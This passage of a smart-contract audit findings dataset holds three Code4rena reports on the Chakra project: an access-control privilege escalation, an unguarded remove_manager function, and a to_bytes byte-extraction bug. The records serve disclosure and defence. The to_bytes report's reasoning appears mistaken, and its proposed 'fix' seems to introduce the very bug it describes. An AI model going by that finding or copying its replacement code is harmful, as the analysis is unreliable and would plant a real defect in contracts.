Summary\nThe to_bytes function attempts to extract a specified number of bytes from the input `bytes32`, but it does so incorrectly:\n\n1. It uses a left shift (`shl`) operation, which moves the most significant bytes of the input to the beginning of the output array.\n2. This approach effectively discards the least significant bytes of the input, which is typically not the desired behavior when working with Ethereum addresses or other data stored in `bytes32`.\n\n### Code Snippet\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/AddressCast.sol#L32\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    unchecked {\n        uint256 offset = 256 - _size * 8;\n        assembly {\n            mstore(add(result, 32), shl(offset, _addressBytes32))\n        }\n    }\n}\n```\n\n### Impact\n1. **Data Loss**: The function will always return the most significant bytes of the input, regardless of where the actual data of interest is located within the `bytes32`.\n2. **Inconsistency with Ethereum Conventions**: Ethereum typically stores addresses and other smaller data types in the least significant bytes of larger types like `bytes32`.\n\n### Example Scenario\nSuppose we have an Ethereum address stored in a `bytes32`:\n\n```solidity\naddress addr = 0x742d35Cc6634C0532925a3b844Bc454e4438f44e;\nbytes32 addrBytes32 = bytes32(uint256(uint160(addr)));\n```\n\nIf we call `to_bytes(addrBytes32, 20)`, we expect to get the 20 bytes representing the address. However, the current implementation will return the 20 most significant bytes of `addrBytes32`, which would be mostly zeros, not the actual address bytes.\n\n### Fix\nA correct implementation should extract the least significant bytes:\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    assembly {\n        mstore(add(result, 32), _addressBytes32)\n    }\n}\n```\n\nThis implementation simply copies the least significant bytes of the input `bytes32` to the output `bytes` array, which is the correct behavior for most Ethereum-related use cases.\n\n\n\n## Assessed type\n\nContext"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": "### Fix\nA correct implementation should extract the least significant bytes:\n\n```solidity\nfunction to_bytes(\n    bytes32 _addressBytes32,\n    uint256 _size\n) internal pure returns (bytes memory result) {\n    if (_size == 0 || _size > 32)\n        revert AddressCast_InvalidSizeForAddress();\n    result = new bytes(_size);\n    assembly {\n        mstore(add(result, 32), _addressBytes32)\n    }\n}\n```\n\nThis implementation simply copies the least significant bytes of the input `bytes32` to the output `bytes` array, which is the correct behavior for most Ethereum-related use cases.\n\n\n\n## Assessed type\n\nContext\n", "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-208", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 208, "page_start": null, "title": "Default admin role not revoked on ownership transfer provides old owner address with same privileges", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64\n\n\n# Vulnerability details\n\n## Summary\n\n**Context:**\nIn `handler/SettlementSignatureVerifier.sol`, `settlement/SettlementSignatureVerifier.sol` and `BaseSettlement.sol`, during initialization, the owner is provided with the DEFAULT_ADMIN_ROLE. In these contracts, the owner has the ability to call the add_manager()/remove_manager() functions to add/remove managers. These functions are restricted to the owner by the onlyOwner modifier.\n\n**Issue:**\nThe issue is that if the ownership is transferred to another owner, the DEFAULT_ADMIN_ROLE is not revoked from the old owner.\n\n**Impact:**\nDue to this, the old owner has access to call the public grantRole()/revokeRole() functions inherited from the AccessControlUpgradeable.sol contract. This is a privilege escalation issue since the old owner still has access to the roles management after being considered non-privileged in the system.\n\n## Proof of Concept\n\n1. In the initialize() function of the three respective contracts ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)), we can see that the owner is provided with the DEFAULT_ADMIN_ROLE.\n\n```solidity\n        _grantRole(DEFAULT_ADMIN_ROLE, _owner);\n```\n\n2. In the add_manager()/remove_manager() function of the three respective contract ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L149C1-L162C6), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L83C3-L96C6), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L62C1-L70C6)), the MANAGER_ROLE can be granted to an address only by the current owner due to the onlyOwner modifier.\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\n3. Now let's say, the ownership of either of the three contracts is transferred from address(A) to address(B) using the transferOwnership() function from the inherited OwnableUpgradeable.sol contract. This means that now only address(B) should be having the privilege to call the add_manager()/remove_manager() functions while address(A) is considered to be removed from the privileged system.\n\n```solidity\nFile: OwnableUpgradeable.sol\n102:     function transferOwnership(address newOwner) public virtual onlyOwner {\n103:         if (newOwner == address(0)) {\n104:             revert OwnableInvalidOwner(address(0));\n105:         }\n106:         _transferOwnership(newOwner);\n107:     }\n```\n\n4. But as we observed in step 1 above, due to the DEFAULT_ADMIN_ROLE not being revoked on ownership transfer, address(A) still has the same privileges. Although the old owner does not have access to the add_manager() and revoke_manager() functions that are only restricted to the current owner, the old owner does have access to the public grantRole()/revokeRole() functions from the inherited AccessControlUpgradeable.sol contract.\n - The old owner can use this functionality to take over either of the three contracts (where the ownership transfer took place) and add/remove the critical MANAGER_ROLE addresses that handle addition/removal of validators and setting the required number of validators for the signature validation threshold. The old owner could provide itself or some other address the MANAGER_ROLE to cause harm.\n```solidity\n    function grantRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _grantRole(role, account);\n    }\n\n\n    function revokeRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _revokeRole(role, account);\n    }\n```\n\n5. Note that the ownership can be transferred for several reasons such as in case the address is compromised, becomes malicious or there has been a decision to simply make the address non-privileged (e.g. private key rotation as a security practice).\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nOverride the transferOwnership() function and revoke the DEFAULT_ADMIN_ROLE from the old owner and provide it to the new owner.\n\nAnother simple solution would be to use the [TokenRoles.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol) contract but for the MANAGER_ROLE instead of the OPERATOR_ROLE.\n\n\n## Assessed type\n\nGovernance\n", "sections": {"description_md": null, "impact_md": "**Impact:**\nDue to this, the old owner has access to call the public grantRole()/revokeRole() functions inherited from the AccessControlUpgradeable.sol contract. This is a privilege escalation issue since the old owner still has access to the roles management after being considered non-privileged in the system.\n", "recommendation_md": "## Recommended Mitigation Steps\nOverride the transferOwnership() function and revoke the DEFAULT_ADMIN_ROLE from the old owner and provide it to the new owner.\n\nAnother simple solution would be to use the [TokenRoles.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol) contract but for the MANAGER_ROLE instead of the OPERATOR_ROLE.\n\n\n## Assessed type\n\nGovernance\n", "poc_md": "## Proof of Concept\n\n1. In the initialize() function of the three respective contracts ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)), we can see that the owner is provided with the DEFAULT_ADMIN_ROLE.\n\n```solidity\n        _grantRole(DEFAULT_ADMIN_ROLE, _owner);\n```\n\n2. In the add_manager()/remove_manager() function of the three respective contract ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L149C1-L162C6), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L83C3-L96C6), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L62C1-L70C6)), the MANAGER_ROLE can be granted to an address only by the current owner due to the onlyOwner modifier.\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\n3. Now let's say, the ownership of either of the three contracts is transferred from address(A) to address(B) using the transferOwnership() function from the inherited OwnableUpgradeable.sol contract. This means that now only address(B) should be having the privilege to call the add_manager()/remove_manager() functions while address(A) is considered to be removed from the privileged system.\n\n```solidity\nFile: OwnableUpgradeable.sol\n102:     function transferOwnership(address newOwner) public virtual onlyOwner {\n103:         if (newOwner == address(0)) {\n104:             revert OwnableInvalidOwner(address(0));\n105:         }\n106:         _transferOwnership(newOwner);\n107:     }\n```\n\n4. But as we observed in step 1 above, due to the DEFAULT_ADMIN_ROLE not being revoked on ownership transfer, address(A) still has the same privileges. Although the old owner does not have access to the add_manager() and revoke_manager() functions that are only restricted to the current owner, the old owner does have access to the public grantRole()/revokeRole() functions from the inherited AccessControlUpgradeable.sol contract.\n - The old owner can use this functionality to take over either of the three contracts (where the ownership transfer took place) and add/remove the critical MANAGER_ROLE addresses that handle addition/removal of validators and setting the required number of validators for the signature validation threshold. The old owner could provide itself or some other address the MANAGER_ROLE to cause harm.\n```solidity\n    function grantRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _grantRole(role, account);\n    }\n\n\n    function revokeRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _revokeRole(role, account);\n    }\n```\n\n5. Note that the ownership can be transferred for several reasons such as in case the address is compromised, becomes malicious or there has been a decision to simply make the address non-privileged (e.g. private key rotation as a security practice).\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64\n\n**container:**\n# Vulnerability details\n\n## Summary\n\n**Context:**\nIn `handler/SettlementSignatureVerifier.sol`, `settlement/SettlementSignatureVerifier.sol` and `BaseSettlement.sol`, during initialization, the owner is provided with the DEFAULT_ADMIN_ROLE. In these contracts, the owner has the ability to call the add_manager()/remove_manager() functions to add/remove managers. These functions are restricted to the owner by the onlyOwner modifier.\n\n**Issue:**\nThe issue is that if the ownership is transferred to another owner, the DEFAULT_ADMIN_ROLE is not revoked from the old owner.\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64\n\n\n# Vulnerability details\n\n## Summary\n\n**Context:**\nIn `handler/SettlementSignatureVerifier.sol`, `settlement/SettlementSignatureVerifier.sol` and `BaseSettlement.sol`, during initialization, the owner is provided with the DEFAULT_ADMIN_ROLE. In these contracts, the owner has the ability to call the add_manager()/remove_manager() functions to add/remove managers. These functions are restricted to the owner by the onlyOwner modifier.\n\n**Issue:**\nThe issue is that if the ownership is transferred to another owner, the DEFAULT_ADMIN_ROLE is not revoked from the old owner.\n\n**Impact:**\nDue to this, the old owner has access to call the public grantRole()/revokeRole() functions inherited from the AccessControlUpgradeable.sol contract. This is a privilege escalation issue since the old owner still has access to the roles management after being considered non-privileged in the system.\n\n## Proof of Concept\n\n1. In the initialize() function of the three respective contracts ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)), we can see that the owner is provided with the DEFAULT_ADMIN_ROLE.\n\n```solidity\n        _grantRole(DEFAULT_ADMIN_ROLE, _owner);\n```\n\n2. In the add_manager()/remove_manager() function of the three respective contract ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L149C1-L162C6), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L83C3-L96C6), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L62C1-L70C6)), the MANAGER_ROLE can be granted to an address only by the current owner due to the onlyOwner modifier.\n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\n3. Now let's say, the ownership of either of the three contracts is transferred from address(A) to address(B) using the transferOwnership() function from the inherited OwnableUpgradeable.sol contract. This means that now only address(B) should be having the privilege to call the add_manager()/remove_manager() functions while address(A) is considered to be removed from the privileged system.\n\n```solidity\nFile: OwnableUpgradeable.sol\n102:     function transferOwnership(address newOwner) public virtual onlyOwner {\n103:         if (newOwner == address(0)) {\n104:             revert OwnableInvalidOwner(address(0));\n105:         }\n106:         _transferOwnership(newOwner);\n107:     }\n```\n\n4. But as we observed in step 1 above, due to the DEFAULT_ADMIN_ROLE not being revoked on ownership transfer, address(A) still has the same privileges. Although the old owner does not have access to the add_manager() and revoke_manager() functions that are only restricted to the current owner, the old owner does have access to the public grantRole()/revokeRole() functions from the inherited AccessControlUpgradeable.sol contract.\n - The old owner can use this functionality to take over either of the three contracts (where the ownership transfer took place) and add/remove the critical MANAGER_ROLE addresses that handle addition/removal of validators and setting the required number of validators for the signature validation threshold. The old owner could provide itself or some other address the MANAGER_ROLE to cause harm.\n```solidity\n    function grantRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _grantRole(role, account);\n    }\n\n\n    function revokeRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _revokeRole(role, account);\n    }\n```\n\n5. Note that the ownership can be transferred for several reasons such as in case the address is compromised, becomes malicious or there has been a decision to simply make the address non-privileged (e.g. private key rotation as a security practice).\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nOverride the transferOwnership() function and revoke the DEFAULT_ADMIN_ROLE from the old owner and provide it to the new owner.\n\nAnother simple solution would be to use the [TokenRoles.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol) contract but for the MANAGER_ROLE instead of the OPERATOR_ROLE.\n\n\n## Assessed type\n\nGovernance\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64\n\n\n# Vulnerability details\n\n## Summary\n\n**Context:**\nIn `handler/SettlementSignatureVerifier.sol`, `settlement/SettlementSignatureVerifier.sol` and `BaseSettlement.sol`, during initialization, the owner is provided with the DEFAULT_ADMIN_ROLE. In these contracts, the owner has the ability to call the add_manager()/remove_manager() functions to add/remove managers. These functions are restricted to the owner by the onlyOwner modifier. \n\n**Issue:**\nThe issue is that if the ownership is transferred to another owner, the DEFAULT_ADMIN_ROLE is not revoked from the old owner.\n\n**Impact:**\nDue to this, the old owner has access to call the public grantRole()/revokeRole() functions inherited from the AccessControlUpgradeable.sol contract. This is a privilege escalation issue since the old owner still has access to the roles management after being considered non-privileged in the system.\n\n## Proof of Concept\n\n1. In the initialize() function of the three respective contracts ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L64), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)), we can see that the owner is provided with the DEFAULT_ADMIN_ROLE.\n\n```solidity\n        _grantRole(DEFAULT_ADMIN_ROLE, _owner);\n```\n\n2. In the add_manager()/remove_manager() function of the three respective contract ([1](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/BaseSettlement.sol#L149C1-L162C6), [2](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L83C3-L96C6), [3](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/SettlementSignatureVerifier.sol#L62C1-L70C6)), the MANAGER_ROLE can be granted to an address only by the current owner due to the onlyOwner modifier. \n\n```solidity\n    function add_manager(address _manager) external onlyOwner {\n        grantRole(MANAGER_ROLE, _manager);\n        emit ManagerAdded(msg.sender, _manager);\n    }\n\n    function remove_manager(address _manager) external onlyOwner {\n        revokeRole(MANAGER_ROLE, _manager);\n        emit ManagerRemoved(msg.sender, _manager);\n    }\n```\n\n3. Now let's say, the ownership of either of the three contracts is transferred from address(A) to address(B) using the transferOwnership() function from the inherited OwnableUpgradeable.sol contract. This means that now only address(B) should be having the privilege to call the add_manager()/remove_manager() functions while address(A) is considered to be removed from the privileged system.\n\n```solidity\nFile: OwnableUpgradeable.sol\n102:     function transferOwnership(address newOwner) public virtual onlyOwner {\n103:         if (newOwner == address(0)) {\n104:             revert OwnableInvalidOwner(address(0));\n105:         }\n106:         _transferOwnership(newOwner);\n107:     }\n```\n\n4. But as we observed in step 1 above, due to the DEFAULT_ADMIN_ROLE not being revoked on ownership transfer, address(A) still has the same privileges. Although the old owner does not have access to the add_manager() and revoke_manager() functions that are only restricted to the current owner, the old owner does have access to the public grantRole()/revokeRole() functions from the inherited AccessControlUpgradeable.sol contract. \n - The old owner can use this functionality to take over either of the three contracts (where the ownership transfer took place) and add/remove the critical MANAGER_ROLE addresses that handle addition/removal of validators and setting the required number of validators for the signature validation threshold. The old owner could provide itself or some other address the MANAGER_ROLE to cause harm. \n```solidity\n    function grantRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _grantRole(role, account);\n    }\n\n\n    function revokeRole(bytes32 role, address account) public virtual onlyRole(getRoleAdmin(role)) {\n        _revokeRole(role, account);\n    }\n```\n\n5. Note that the ownership can be transferred for several reasons such as in case the address is compromised, becomes malicious or there has been a decision to simply make the address non-privileged (e.g. private key rotation as a security practice).\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nOverride the transferOwnership() function and revoke the DEFAULT_ADMIN_ROLE from the old owner and provide it to the new owner.\n\nAnother simple solution would be to use the [TokenRoles.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol) contract but for the MANAGER_ROLE instead of the OPERATOR_ROLE. \n\n\n## Assessed type\n\nGovernance"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-232", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 232, "page_start": null, "title": "The remove_manager() method does not have a minimum number of managers, which may cause all managers to be deleted.", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\n\n# Vulnerability details\n\n## Impact\n\nThe remove_manager() method does not have a minimum number of managers, which may cause all managers to be deleted.\n\nThe current implementation of the remove_manager function does not check whether all managers are removed, which poses a significant risk. If all managers are removed from the system, it will lose its administrative functionality. Without any managers, no one can execute critical administrative tasks, such as adding new managers, validators, or upgrading the contract. This may result in the system being unable to respond to necessary changes, effectively locking the contract in its current state.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\nIn the current implementation, the remove_manager function simply removes a manager by setting their status to 0 in the chakra_managers storage, without ensuring that at least one manager remains. This creates a situation where all managers could potentially be removed.\n\nHeres a simplified view of the relevant part:\n\n```\nfn remove_manager(ref self: ContractState, old_manager: ContractAddress) -> bool {\n    let caller = get_caller_address();\n    assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n    self.chakra_managers.write(old_manager, 0);\n    self\n        .emit(\n            ManagerRemoved {\n                operator: caller,\n                old_manager: old_manager,\n                removed_at: get_block_timestamp()\n            }\n        );\n    return self.chakra_managers.read(old_manager) == 0;\n}\n```\n\nIn this example, after calling remove_manager, there is no check to ensure that at least one manager remains in the chakra_managers map. If the last remaining manager is removed, the system will be left without any entity that can perform administrative actions.\n\n## Tools Used\n\nVSCode\n\n## Recommended Mitigation Steps\n\n**Ensure at Least One Manager Remains**: Before allowing a manager to be removed, add a check to ensure that there is at least one other manager left in the system. This can be done by counting the number of managers in the `chakra_managers` storage and asserting that it is greater than one before executing the removal.\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe remove_manager() method does not have a minimum number of managers, which may cause all managers to be deleted.\n\nThe current implementation of the remove_manager function does not check whether all managers are removed, which poses a significant risk. If all managers are removed from the system, it will lose its administrative functionality. Without any managers, no one can execute critical administrative tasks, such as adding new managers, validators, or upgrading the contract. This may result in the system being unable to respond to necessary changes, effectively locking the contract in its current state.\n", "recommendation_md": "## Recommended Mitigation Steps\n", "poc_md": "## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\nIn the current implementation, the remove_manager function simply removes a manager by setting their status to 0 in the chakra_managers storage, without ensuring that at least one manager remains. This creates a situation where all managers could potentially be removed.\n\nHeres a simplified view of the relevant part:\n\n```\nfn remove_manager(ref self: ContractState, old_manager: ContractAddress) -> bool {\n    let caller = get_caller_address();\n    assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n    self.chakra_managers.write(old_manager, 0);\n    self\n        .emit(\n            ManagerRemoved {\n                operator: caller,\n                old_manager: old_manager,\n                removed_at: get_block_timestamp()\n            }\n        );\n    return self.chakra_managers.read(old_manager) == 0;\n}\n```\n\nIn this example, after calling remove_manager, there is no check to ensure that at least one manager remains in the chakra_managers map. If the last remaining manager is removed, the system will be left without any entity that can perform administrative actions.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nVSCode\n\n**Ensure at Least One Manager Remains**: Before allowing a manager to be removed, add a check to ensure that there is at least one other manager left in the system. This can be done by counting the number of managers in the `chakra_managers` storage and asserting that it is greater than one before executing the removal.\n\n\n## Assessed type\n\nOther\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\n\n# Vulnerability details\n\n## Impact\n\nThe remove_manager() method does not have a minimum number of managers, which may cause all managers to be deleted.\n\nThe current implementation of the remove_manager function does not check whether all managers are removed, which poses a significant risk. If all managers are removed from the system, it will lose its administrative functionality. Without any managers, no one can execute critical administrative tasks, such as adding new managers, validators, or upgrading the contract. This may result in the system being unable to respond to necessary changes, effectively locking the contract in its current state.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L260\n\nIn the current implementation, the remove_manager function simply removes a manager by setting their status to 0 in the chakra_managers storage, without ensuring that at least one manager remains. This creates a situation where all managers could potentially be removed.\n\nHeres a simplified view of the relevant part:\n\n```\nfn remove_manager(ref self: ContractState, old_manager: ContractAddress) -> bool {\n    let caller = get_caller_address();\n    assert(self.chakra_managers.read(caller) == 1, Errors::NOT_MANAGER);\n    self.chakra_managers.write(old_manager, 0);\n    self\n        .emit(\n            ManagerRemoved {\n                operator: caller,\n                old_manager: old_manager,\n                removed_at: get_block_timestamp()\n            }\n        );\n    return self.chakra_managers.read(old_manager) == 0;\n}\n```\n\nIn this example, after calling remove_manager, there is no check to ensure that at least one manager remains in the chakra_managers map. If the last remaining manager is removed, the system will be left without any entity that can perform administrative actions.\n\n## Tools Used\n\nVSCode\n\n## Recommended Mitigation Steps\n\n**Ensure at Least One Manager Remains**: Before allowing a manager to be removed, add a check to ensure that there is at least one other manager left in the system. This can be done by counting the number of managers in the `chakra_managers` storage and asserting that it is greater than one before executing the removal.\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of 